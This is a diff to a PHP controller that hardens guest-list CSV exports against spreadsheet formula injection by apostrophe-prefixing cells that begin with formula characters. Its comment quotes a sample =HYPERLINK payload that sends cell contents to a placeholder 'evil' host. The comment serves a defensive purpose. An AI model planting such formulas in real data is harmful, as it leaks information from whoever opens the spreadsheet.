@@ -91,9 +91,9 @@ class GuestListExportController extends Controller
         // field separator, and a comma-delimited file opens as one column.
         fputcsv($handle, $list->headers(), ';');
         foreach ($list->rows() as $row) {
-            fputcsv($handle, $row, ';');
+            fputcsv($handle, array_map(self::defuse(...), $row), ';');
         }
-        fputcsv($handle, $list->totals(), ';');
+        fputcsv($handle, array_map(self::defuse(...), $list->totals()), ';');
 
         rewind($handle);
         $csv = (string) stream_get_contents($handle);
@@ -103,6 +103,29 @@ class GuestListExportController extends Controller
             'Content-Type' => 'text/csv; charset=UTF-8',
             'Content-Disposition' => 'attachment; filename="'.$list->filename().'.csv"',
         ]);
+    }
+
+    /**
+     * Stops Excel executing a guest's name.
+     *
+     * Every identity column in this file comes from the PUBLIC booking form
+     * and is validated only as a string, so a booking under the name
+     * =HYPERLINK("https://evil/"&A1,"cliquez") is a live formula the moment
+     * a committee member opens the CSV. Prefixing with an apostrophe makes
+     * Excel treat the cell as text; the apostrophe itself is not displayed.
+     *
+     * CSV ONLY. The XLSX writer emits typed string cells that Excel does
+     * not re-parse, and Markdown is not executed by anything. Applying it
+     * more widely would put stray apostrophes in the other formats and
+     * break the agreement between them that GuestList exists to guarantee.
+     */
+    private static function defuse(mixed $cell): mixed
+    {
+        if (! is_string($cell) || $cell === '') {
+            return $cell;
+        }
+
+        return str_contains("=+-@\t\r", $cell[0]) ? "'".$cell : $cell;
     }
 
     private function markdown(GuestList $list): Response
